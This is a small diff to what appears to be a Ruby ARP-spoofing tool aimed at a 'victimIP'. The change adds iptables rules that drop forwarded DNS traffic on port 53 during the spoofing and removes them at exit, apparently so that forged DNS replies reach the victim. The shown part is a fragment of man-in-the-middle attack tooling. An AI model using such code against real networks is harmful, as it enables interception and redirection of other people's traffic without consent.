@@ -41,6 +41,8 @@ def init(intface, victimIP)
 
 	# Initialize IP Forwarding
 	`echo 1 > /proc/sys/net/ipv4/ip_forward`
+	`iptables -A FORWARD -p UDP --dport 53 -j DROP`
+	`iptables -A FORWARD -p TCP --dport 53 -j DROP`
 
 end
 
@@ -192,6 +194,8 @@ begin
 		Thread.kill(arp_spoof_thread)
 		revertArpPackets()
 		`echo 0 > /proc/sys/net/ipv4/ip_forward`
+		`iptables -D FORWARD -p UDP --dport 53 -j DROP`
+		`iptables -D FORWARD -p TCP --dport 53 -j DROP`
 		exit 0
 
 end # End main
